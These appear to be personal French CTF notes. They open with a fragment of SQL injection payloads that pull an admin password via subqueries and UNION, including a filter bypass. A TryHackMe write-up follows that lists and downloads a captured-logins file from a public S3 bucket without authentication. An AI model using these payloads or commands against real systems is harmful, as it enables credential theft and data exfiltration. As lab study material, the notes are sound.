Insert : 

', (SELECT password FROM users WHERE username = 'admin')) --

Filter bypass :

'union/**/select/**/username,ppasswordassword/**/from/**/users/**/where/**/username='admin'--

DOJO #1 :

admin') UNION SELECT password from users WHERE (username LIKE 'admin

DOJO #2 :

admin' AND (SELselectECT null FROM sqlite_master) AND ' (pas finis)

---
type: WriteUp
collections: TryHackMe
title: A Bucket of Phish
createdAt: '2025-05-26T07:51:19.287Z'
creationDate: 2025-05-26 09:51
modificationDate: 2025-05-26 09:56
tags: [TryHackMe, AWS]
---

> [A Bucket of Phish](https://tryhackme.com/room/hfb1abucketofphish)



# Write-Up – AWS S3 Bucket Enumeration & Exfiltration

---

## Contexte

Accéder à un bucket S3 mal configuré, énumérer son contenu, et exfiltrer un fichier contenant un flag.

---

## 🔎  Reconnaissance

Un nom de domaine ou une URL publique pointe vers un bucket S3 exposé via le service **AWS S3 Website Hosting**. Exemple :

```text
http://darkinjector-phish.s3-website-us-west-2.amazonaws.com
```

---

### Enumération du bucket

La commande suivante permet de **lister le contenu d’un bucket S3** sans authentification (public access) :

```bash
aws s3 ls s3://darkinjector-phish --no-sign-request --region us-west-2
```

**Résultat :**

```bash
2025-03-17 06:46:17        132 captured-logins-093582390 
2025-03-17 06:25:33       2300 index.html
```

➡️ Deux fichiers sont disponibles, dont un nommé `captured-logins-093582390`.

---

## Exfiltration du fichier

Téléchargement du fichier sensible :

```bash
aws s3 cp s3://darkinjector-phish/captured-logins-093582390 ./ --no-sign-request --region us-west-2
```

---

## Lecture du contenu`

```bash
cat captured-logins-093582390
```

`=> THM{FLAG}`

---

## Conclusion

Le bucket était :

- **Public** (accessible sans authentification)

- **Listable** (`ListBucket` activé)

- Et contenait **des credentials et un flag CTF en clair**

